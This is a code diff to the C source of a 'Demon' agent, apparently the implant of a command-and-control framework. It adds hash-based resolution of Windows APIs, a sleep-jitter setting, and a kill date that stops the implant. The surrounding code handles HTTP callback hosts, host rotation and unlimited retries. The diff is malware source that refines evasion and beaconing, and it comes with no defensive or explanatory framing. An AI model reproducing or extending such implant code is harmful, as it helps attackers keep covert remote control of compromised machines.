@@ -352,6 +352,8 @@ VOID DemonInit( VOID )
         Instance.Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64DisableWow64FsRedirection );
         Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64RevertWow64FsRedirection );
         Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetModuleHandleA );
+        Instance.Win32.GetSystemTimeAsFileTime             = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetSystemTimeAsFileTime );
+
     }
 
     // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
@@ -831,6 +833,8 @@ VOID DemonConfig()
     RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
 
     Instance.Config.Sleeping       = ParserGetInt32( &Parser );
+    Instance.Config.Jitter         = ParserGetInt32( &Parser );
+    PRINTF( "Sleep: %d (%d%%)\n", Instance.Config.Sleeping, Instance.Config.Jitter )
 
     Instance.Config.Memory.Alloc   = ParserGetInt32( &Parser );
     Instance.Config.Memory.Execute = ParserGetInt32( &Parser );
@@ -871,6 +875,15 @@ VOID DemonConfig()
     )
 
 #ifdef TRANSPORT_HTTP
+    Instance.Config.Transport.KillDate       = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
+    // check if the kill date has already passed
+    if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+    {
+        // refuse to run
+        // TODO: exit process?
+        Instance.Win32.RtlExitUserThread(0);
+    }
     Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
     Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
     Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
@@ -880,7 +893,7 @@ VOID DemonConfig()
 
     /* J contains our Hosts counter */
     J = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Hosts [%d]:", J )
+    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
